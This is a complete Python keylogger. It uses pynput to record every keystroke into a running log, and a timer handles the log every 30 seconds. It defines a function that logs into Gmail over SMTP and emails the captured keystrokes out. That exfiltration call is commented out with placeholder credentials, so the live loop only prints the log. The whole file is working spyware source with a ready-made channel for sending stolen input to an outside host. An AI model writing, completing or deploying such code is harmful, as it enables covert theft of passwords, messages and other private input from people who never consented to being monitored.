import pynput.keyboard
import smtplib
import threading

log = ""

def main(key):
    global log
    log = log + str(key)
    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

#thread - threading
def thread_function():
    global log
    
    # send_email("user@gmail.com", "password", log.encode('utf-8'))
    print(log.encode('utf-8'))
    
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=main)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
